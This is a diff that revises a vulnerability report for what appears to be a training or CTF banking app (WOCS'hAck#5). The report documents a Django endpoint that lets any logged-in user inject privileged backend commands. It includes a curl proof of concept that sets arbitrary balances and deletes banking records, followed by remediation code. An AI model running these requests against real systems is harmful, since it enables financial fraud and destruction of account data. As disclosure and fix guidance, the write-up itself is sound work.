@@ -1,113 +1,163 @@
 # Description
 
-**CWE-74: Improper Neutralization of Special Elements in Output** (injection into a downstream protocol)
+**CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection)**
+**Related: CWE-863 — Incorrect Authorization**
 
 The `quick_transfer` view accepts an arbitrary JSON object from the client and forwards it to the banking socket backend. A default `command` and the active `sid` are set first, and then the entire client-supplied dictionary is merged over them. Because the merge happens last, the client controls every field of the backend protocol message, including `command`, `sid`, and every per-command argument such as `user_id` and `amount`. No allow-list of fields or commands is applied.
 
-Vulnerable code (`D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\djangoWocshack_5\Bank\views.py`):
+Vulnerable code (`djangoWocshack_5/Bank/views.py`):
 
 ```python
-# Bank/views.py:421-440
-@csrf_exempt                                                  # line 421
-@login_required()                                             # line 422
-def quick_transfer(request):                                  # line 423
+@csrf_exempt
+@login_required()
+def quick_transfer(request):
     try:
-        data = json.loads(request.body)                       # line 425
+        data = json.loads(request.body)
     except (json.JSONDecodeError, Exception):
         return JsonResponse({"error": "invalid JSON"}, status=400)
-    cli, sid = make_connection()                              # line 428
+    cli, sid = make_connection()
     if cli is not False and cli is not None:
-        payload = {"command": data.get("action", "tr"), "sid": sid}   # line 430
-        payload.update(data)                                  # line 431  <-- client overrides any field
-        cli.send(payload)                                     # line 432
-        response = cli.receive()                              # line 433
+        payload = {"command": data.get("action", "tr"), "sid": sid}
+        payload.update(data)  # Client overrides command, sid and other fields
+        cli.send(payload)
+        response = cli.receive()
         ...
         return JsonResponse(response or {"error": "no response"})
     return JsonResponse({"error": "unavailable"})
 ```
 
-Route: `D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\djangoWocshack_5\Bank\urls.py:63`
+Route: `djangoWocshack_5/Bank/urls.py`
 (`path("api/quick-transfer/", views.quick_transfer, name="bank_quick_transfer")`), mounted under `/banking/`.
 
 Why this is exploitable:
 
 - `payload.update(data)` lets the client replace `command`, so any command the backend parser understands is reachable, including ones with no Django wrapper.
-- The backend parser (`D:\Documents\WOCSA\WOCShAck\WOCShAck#5\wocshack\VRC_Banking_System_Backend\Utils\parser.py`) dispatches on `command`: `delu` at line 500, `sb` at line 510. Its handlers `delete_user` (line 170) and `set_balance` (line 419) act directly on the `user_id` they receive.
-- The backend only checks that the `sid` exists in its session table (`parser.py:488`). It has no notion of which Django user owns the request, and it does not check whether the caller is an administrator. Any logged-in user can open a session with `make_connection()` and then issue privileged commands.
-- The view is `@csrf_exempt`, so the endpoint is also reachable cross-site from a victim's browser session.
+- The backend parser (`VRC_Banking_System_Backend/Utils/parser.py`) dispatches on `command`, including `delu` and `sb`. Its handlers `delete_user` and `set_balance` act directly on the `user_id` they receive.
+- The backend only checks that the `sid` exists in its session table. It has no notion of which Django user owns the request, and it does not check whether the caller is an administrator. Any authenticated user can open a session with `make_connection()` and then issue privileged commands.
+- The view is `@csrf_exempt`, disabling Django's CSRF protection for this endpoint. Cross-site exploitation may also be possible depending on browser cookie policies and request context.
 
 # Exploitation
 
 | Step | Action | Result |
 |------|--------|--------|
 | 1 | Register or use any low-privilege account (e.g. `john`) and log in at `/account/login/`, saving the session cookie to `john.cookies`. | Authenticated session cookie obtained. |
-| 2 | Send `POST /banking/api/quick-transfer/` with body `{"action": "sb", "user_id": 1, "amount": 999999999}`. | Django builds `{"command": "sb", "sid": <new>}`, then `update(data)` adds `action`, `user_id` and `amount` to the payload. The backend runs `set_balance` for user 1 and returns `{"status": "success"}`. |
-| 3 | Send `POST /banking/api/quick-transfer/` with body `{"action": "delu", "user_id": 2}`. | The backend runs `delete_user` for user 2 and returns `{"status": "success"}`. The victim account is removed. |
-| 4 | Send the same request with `{"command": "sb", ...}` directly instead of `action`. | Also accepted, because `update(data)` overrides the default `command` regardless of how it is supplied. |
+| 2 | Identify the banking backend ID of a separate disposable account, then send `POST /banking/api/quick-transfer/` with body `{"action":"sb","user_id":<TARGET_ID>,"amount":999999999}`. | Django builds `{"command":"sb","sid":<new>}`, then `update(data)` adds the client-supplied fields. The backend runs `set_balance` for the target account and returns `{"status":"success"}`. |
+| 3 | Send `{"command":"sb","user_id":<TARGET_ID>,"amount":1}` directly instead of using `action`. | Also accepted, because `update(data)` overrides the default `command` regardless of how it is supplied. |
+| 4 | Send `{"action":"delu","user_id":<TARGET_ID>}`. | The backend runs `delete_user` and returns `{"status":"success"}`. The target banking record is removed. |
 
-Note on step 2 and 3: the `command` key is set by the view's default from `action`, but the merge means the attacker can also set `command` directly. Using `action` is the documented form.
+**Note:** The `user_id` parameter refers to the banking backend's user ID, which is not necessarily the Django user ID or the position of an entry in `/api/users/`.
+
+The `command` key is initially set by the view from `action`, but the subsequent merge allows the client to override `command` directly. Using `action` is the documented form.
 
 # PoC
 
+The following commands were reproduced on a local WOCS'hAck#5 instance using a low-privilege account and a separate disposable banking account.
+
 ```bash
-# 0) Log in and store the session cookie (the login form field names depend on the Account app)
-curl -s -c john.cookies -b john.cookies http://localhost:8000/account/login/ -o /dev/null
-curl -s -c john.cookies -b john.cookies -X POST http://localhost:8000/account/login/ \
-  -d "username=john&password=<password>"
+# 0) Log in and store the session cookie
+# First retrieve Django's CSRF cookie
+curl -sS -c john.cookies -b john.cookies \
+  http://localhost:8000/account/login/ -o /dev/null
 
-# 1) Set user 1's balance to 999,999,999 (balance manipulation)
-curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
-  -H "Content-Type: application/json" \
-  -d '{"action":"sb","user_id":1,"amount":999999999}'
-# -> {"status": "success"}
+CSRF=$(awk '$6=="csrftoken" {print $7; exit}' john.cookies)
 
-# 2) Delete user 2 (arbitrary user deletion)
-curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
-  -H "Content-Type: application/json" \
-  -d '{"action":"delu","user_id":2}'
-# -> {"status": "success"}
+# Authenticate with a low-privilege account
+read -rsp "Password: " PASS
+echo
 
-# 3) Equivalent form that overrides the command field directly
-curl -s -b john.cookies -X POST http://localhost:8000/banking/api/quick-transfer/ \
+curl -sS -i -c john.cookies -b john.cookies \
+  -H "Referer: http://localhost:8000/account/login/" \
+  --data-urlencode "username=john" \
+  --data-urlencode "password=$PASS" \
+  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
+  http://localhost:8000/account/login/
+
+unset PASS CSRF
+
+# Verify that authentication succeeded before continuing.
+# A sessionid cookie alone does not prove successful authentication.
+
+# 1) Identify the target's banking backend ID
+curl -sS -b john.cookies \
+  -X POST http://localhost:8000/banking/api/quick-transfer/ \
   -H "Content-Type: application/json" \
-  -d '{"command":"sb","user_id":1,"amount":1}'
-# -> {"status": "success"}
+  -d '{"action":"getau"}' | python3 -m json.tool
+
+# Enter the banking ID of a disposable test account
+read -rp "Disposable target banking ID: " TARGET_ID
+
+# 2) Set the target's balance to 999,999,999
+curl -sS -b john.cookies -X POST \
+  http://localhost:8000/banking/api/quick-transfer/ \
+  -H "Content-Type: application/json" \
+  -d "{\"action\":\"sb\",\"user_id\":${TARGET_ID},\"amount\":999999999}"
+# -> {"status":"success"}
+
+# 3) Override the command field directly
+curl -sS -b john.cookies -X POST \
+  http://localhost:8000/banking/api/quick-transfer/ \
+  -H "Content-Type: application/json" \
+  -d "{\"command\":\"sb\",\"user_id\":${TARGET_ID},\"amount\":1}"
+# -> {"status":"success"}
+
+# 4) Delete the disposable banking account
+# WARNING: Destructive operation. Use only a disposable account.
+curl -sS -b john.cookies -X POST \
+  http://localhost:8000/banking/api/quick-transfer/ \
+  -H "Content-Type: application/json" \
+  -d "{\"action\":\"delu\",\"user_id\":${TARGET_ID}}"
+# -> {"status":"success"}
 ```
 
-Expected result: user 1's balance is set to 999,999,999 and user 2 no longer exists. Both actions are performed by a non-admin account.
+**Expected result:** The target banking account's balance is first set to `999999999`, then to `1`, and finally its banking record is deleted. All operations are performed by a non-admin account.
+
+Deleting the banking record does not necessarily delete the corresponding Django account.
 
 # Risk
 
 | Dimension | Impact |
 |-----------|--------|
-| Confidentiality | Low to moderate directly. The request/response channel returns only status fields for `sb` and `delu`. Other backend commands (for example `getu`) could return user data through the same channel, which is not demonstrated here. |
-| Integrity | High. Any authenticated user can set any account's balance and rewrite arbitrary backend state. |
-| Availability | High. Any authenticated user can delete any user account. |
+| Confidentiality | Low to moderate directly. Other backend commands (such as `getau`) can return banking user information through the same channel. Extensive sensitive-data disclosure has not been demonstrated. |
+| Integrity | High. Any authenticated user can set another account's balance and modify privileged banking state. |
+| Availability | High. Any authenticated user can delete another user's banking record, potentially disrupting banking functionality. |
 
-Overall severity: **Critical** (CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, score 9.1) — the attack is network-reachable, needs only a low-privilege account, and directly allows arbitrary balance changes and account deletion across all users with no user interaction.
+**Overall severity: Critical (WOCS'hAck#5 vulnerability catalog).**
+
+**CVSS 3.1 assessment:** `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H` — **8.3 (High)**.
+
+The attack is network-reachable, requires only a low-privilege account, and directly allows arbitrary balance changes and banking account deletion without user interaction.
+
+The catalog's Critical classification is retained separately from the calculated CVSS score. The confidentiality impact is conservatively rated Low, since extensive sensitive-data disclosure has not been established by this PoC.
 
 # Remediation
 
-1. Stop merging client input into the backend payload. Build the payload from an explicit allow-list of commands and fields, and take `user_id` from `request.user.id` rather than from the request body:
+1. Stop merging client input into the backend payload. Build the payload from an explicit allow-list of permitted commands and fields, and derive the authenticated user's banking identity from a trusted server-side mapping rather than accepting it from the request body:
 
    ```python
-   ACTIONS = {
-       "tr": {"from_id", "to_id", "amount"},
-       # privileged commands are omitted entirely for non-admin callers
-   }
-   cmd = data.get("action")
-   if cmd not in ACTIONS:
+   # Illustrative pseudocode; adapt to the actual banking protocol.
+   cmd = data.get("action", "tr")
+
+   if cmd != "tr":
        return JsonResponse({"error": "unsupported"}, status=400)
-   payload = {"command": cmd, "sid": sid, "user_id": request.user.id}
-   for k in ACTIONS[cmd]:
-       if k in data:
-           payload[k] = data[k]
+
+   bank_user_id = resolve_bank_user_id(request.user)
+
+   payload = {
+       "command": "tr",
+       "sid": sid,
+       "from_id": bank_user_id,
+       "to_id": data.get("to_id"),
+       "amount": data.get("amount"),
+   }
    ```
 
-2. Never let the client set `command` or `sid`. Derive `sid` on the server and ignore any value supplied in the body.
-3. Enforce authorization on the backend, not only in the Django layer: `sb`, `delu`, `sp`, and similar administrative commands should require an admin role bound to the session, and the backend should check that the operation's target belongs to the caller.
-4. Remove `@csrf_exempt` from `quick_transfer` and require a CSRF token for state-changing requests.
-5. Restrict or remove the administrative commands from the banking parser entirely if no legitimate Django path needs them.
+   All transfer parameters must be validated before sending the payload. `resolve_bank_user_id` represents a trusted Django-to-banking identity lookup, not an existing project function. Django user IDs must not be assumed to match banking user IDs.
+
+2. Never let the client set `command` or `sid`. Derive `sid` on the server and ignore any value supplied in the request body.
+3. Enforce authorization on the backend, not only in the Django layer: `sb`, `delu`, `sp`, and similar administrative commands should require an admin role bound to the session. The backend should also verify that each operation is authorized for its target account.
+4. Remove `@csrf_exempt` from `quick_transfer` and require a CSRF token for state-changing browser requests. CSRF protection complements, but does not replace, authorization checks.
+5. Restrict or remove administrative commands from the banking parser entirely if no legitimate Django path needs them.
 
 # Author
+
 WOCSA
